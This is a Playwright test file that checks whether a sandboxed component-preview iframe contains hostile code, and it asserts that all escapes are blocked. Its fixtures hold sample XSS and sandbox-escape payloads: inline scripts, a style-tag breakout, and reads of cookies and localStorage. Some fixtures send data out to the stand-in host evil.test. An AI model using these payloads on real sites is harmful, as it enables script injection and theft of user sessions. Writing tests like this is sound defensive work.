/**
 * Real-browser check of the component preview isolation (src/shared/preview.ts).
 * The parent page is served with the app's own security headers
 * (public/_headers) and embeds hostile HTML/CSS exactly as PreviewFrame does.
 */
import { expect, test, type Frame, type Request } from '@playwright/test'
import { buildPreviewDocument, PREVIEW_SANDBOX, PREVIEW_SANDBOX_WITH_SCRIPTS } from '../../src/shared/preview'

const ORIGIN = 'https://app.test'

const HOSTILE_HTML = `
<h1 id="ok">Rendered component</h1>
<script>document.body.dataset.ran = 'inline'; parent.document.title = 'pwned-inline'; top.location = 'https://evil.test/script-nav';</script>
<img src="x" onerror="document.body.dataset.ran = 'onerror'; parent.document.title = 'pwned-onerror'">
<img src="https://evil.test/pixel.png" alt="">
<link rel="stylesheet" href="https://evil.test/sheet.css">
<a id="top-link" href="https://evil.test/top" target="_top">Top navigation</a>
<a id="blank-link" href="https://evil.test/popup" target="_blank">Popup</a>
<form action="https://evil.test/form" method="post"><input name="q" value="secret"><button id="submit">Send</button></form>
<iframe src="https://evil.test/nested"></iframe>
<object data="https://evil.test/object"></object>
<meta http-equiv="refresh" content="0;url=https://evil.test/refresh">
`
const HOSTILE_CSS = `
body { background-image: url("https://evil.test/bg.png"); }
@import url("https://evil.test/import.css");
@font-face { font-family: x; src: url("https://evil.test/font.woff2"); }
h1 { font-family: x; }
</style><script>parent.document.title = 'pwned-style-breakout'</script><style>
`

const PARENT_HTML = `<!doctype html><html><head><title>Parent</title></head><body>
<iframe id="preview" title="Preview" sandbox="${PREVIEW_SANDBOX}" referrerpolicy="no-referrer" style="width:600px;height:400px"></iframe>
</body></html>`

test('hostile component code cannot escape the preview', async ({ page, context }) => {
  const offOrigin: string[] = []
  await context.route('**/*', async (route) => {
    const url = new URL(route.request().url())
    if (url.origin === ORIGIN) {
      return route.fulfill({
        status: 200,
        contentType: 'text/html',
        // Same headers the deployed app sends (public/_headers).
        headers: {
          'Content-Security-Policy': "object-src 'none'; base-uri 'self'; frame-ancestors 'none'",
          'X-Frame-Options': 'DENY',
          'Referrer-Policy': 'strict-origin-when-cross-origin',
          'X-Content-Type-Options': 'nosniff',
        },
        body: PARENT_HTML,
      })
    }
    offOrigin.push(url.href)
    return route.abort()
  })
  const popups: string[] = []
  context.on('page', (p) => popups.push(p.url()))

  await page.goto(`${ORIGIN}/`)
  await page.evaluate(() => {
    document.cookie = 'session=parent-secret; path=/'
    localStorage.setItem('token', 'parent-secret')
  })
  await page.evaluate((doc) => {
    ;(document.getElementById('preview') as HTMLIFrameElement).srcdoc = doc
  }, buildPreviewDocument({ html: HOSTILE_HTML, css: HOSTILE_CSS }))

  // It still renders, even under the parent's frame-ancestors 'none'.
  const preview = page.frameLocator('#preview')
  await expect(preview.locator('#ok')).toHaveText('Rendered component')
  const frame = page.frames().find((f) => f !== page.mainFrame()) as Frame

  // User-activated attempts: top navigation, popup, form submission.
  await preview.locator('#top-link').click({ noWaitAfter: true })
  await preview.locator('#blank-link').click({ noWaitAfter: true })
  await preview.locator('#submit').click({ noWaitAfter: true })
  await page.waitForTimeout(1500)

  // The parent page is untouched and still where it was.
  expect(page.url()).toBe(`${ORIGIN}/`)
  expect(await page.title()).toBe('Parent')
  expect(popups).toEqual([])

  // No script ran inside the preview (inline, event handler or style breakout).
  expect(await frame.evaluate(() => document.body.dataset.ran ?? null)).toBeNull()

  // Opaque origin: no parent DOM, no cookies, no storage.
  expect(await frame.evaluate(() => {
    try {
      return window.parent.document.title
    } catch {
      return 'blocked'
    }
  })).toBe('blocked')
  expect(await frame.evaluate(() => {
    try {
      return document.cookie
    } catch {
      return 'blocked' // SecurityError: sandboxed without allow-same-origin
    }
  })).toBe('blocked')
  expect(await frame.evaluate(() => {
    try {
      return localStorage.getItem('token')
    } catch {
      return 'blocked'
    }
  })).toBe('blocked')

  // Nothing left for evil.test: no pixels, stylesheets, fonts, frames, forms or navigations.
  expect(offOrigin, `off-origin requests: ${offOrigin.join(', ')}`).toEqual([])
})

test('the preview frame is created with an empty sandbox', async ({ page }) => {
  await page.setContent(PARENT_HTML)
  expect(await page.locator('#preview').getAttribute('sandbox')).toBe('')
  const requests: Request[] = []
  page.on('request', (r) => requests.push(r))
  expect(requests).toHaveLength(0)
})

// Scripts opted in: the sandbox gains exactly allow-scripts (never allow-same-origin).
const HOSTILE_JS = `
const results = {}
const attempt = (name, fn) => { try { results[name] = String(fn()) } catch (e) { results[name] = 'blocked' } }
attempt('parentTitle', () => window.parent.document.title)
attempt('parentWrite', () => { window.parent.document.title = 'pwned-js'; return 'wrote' })
attempt('cookie', () => document.cookie)
attempt('localStorage', () => localStorage.getItem('token'))
attempt('indexedDB', () => indexedDB.open('x') && 'opened')
attempt('popup', () => window.open('https://evil.test/popup') === null ? 'blocked' : 'opened')
attempt('topNav', () => { window.top.location.href = 'https://evil.test/top'; return 'navigated' })
attempt('alert', () => { alert('hi'); return 'shown' })
fetch('https://evil.test/fetch').then(() => { results.fetch = 'sent' }).catch(() => { results.fetch = 'blocked' })
try { const ws = new WebSocket('wss://evil.test/ws'); ws.onerror = () => {} } catch (e) {}
new Image().src = 'https://evil.test/pixel-from-js.png'
window.parent.postMessage({ steal: true }, '*')
setTimeout(() => { document.body.dataset.results = JSON.stringify(results); document.body.dataset.ran = 'yes' }, 300)
`

test('opted-in component JavaScript runs but cannot escape the sandbox', async ({ page, context }) => {
  const offOrigin: string[] = []
  await context.route('**/*', async (route) => {
    const url = new URL(route.request().url())
    if (url.origin === ORIGIN) {
      return route.fulfill({
        status: 200,
        contentType: 'text/html',
        headers: { 'Content-Security-Policy': "object-src 'none'; base-uri 'self'; frame-ancestors 'none'", 'X-Frame-Options': 'DENY' },
        body: PARENT_HTML.replace('sandbox=""', `sandbox="${PREVIEW_SANDBOX_WITH_SCRIPTS}"`),
      })
    }
    offOrigin.push(url.href)
    return route.abort()
  })
  const popups: string[] = []
  context.on('page', (p) => popups.push(p.url()))
  const dialogs: string[] = []
  page.on('dialog', (d) => { dialogs.push(d.message()); void d.dismiss() })

  await page.goto(`${ORIGIN}/`)
  await page.evaluate(() => {
    document.cookie = 'session=parent-secret; path=/'
    localStorage.setItem('token', 'parent-secret')
  })
  await page.evaluate((doc) => {
    ;(document.getElementById('preview') as HTMLIFrameElement).srcdoc = doc
  }, buildPreviewDocument({ html: '<h1 id="ok">Scripted component</h1>', css: '', js: HOSTILE_JS, runScripts: true }))

  const preview = page.frameLocator('#preview')
  await expect(preview.locator('body')).toHaveAttribute('data-ran', 'yes', { timeout: 10_000 })
  const frame = page.frames().find((f) => f !== page.mainFrame()) as Frame
  const results = JSON.parse((await frame.evaluate(() => document.body.dataset.results)) ?? '{}')

  expect(results).toMatchObject({
    parentTitle: 'blocked',
    parentWrite: 'blocked',
    cookie: 'blocked',
    localStorage: 'blocked',
    indexedDB: 'blocked',
    popup: 'blocked',
    topNav: 'blocked',
    fetch: 'blocked',
  })
  expect(dialogs).toEqual([]) // no allow-modals: alert() is ignored
  expect(popups).toEqual([])
  expect(page.url()).toBe(`${ORIGIN}/`)
  expect(await page.title()).toBe('Parent')
  expect(offOrigin, `off-origin requests: ${offOrigin.join(', ')}`).toEqual([])
})
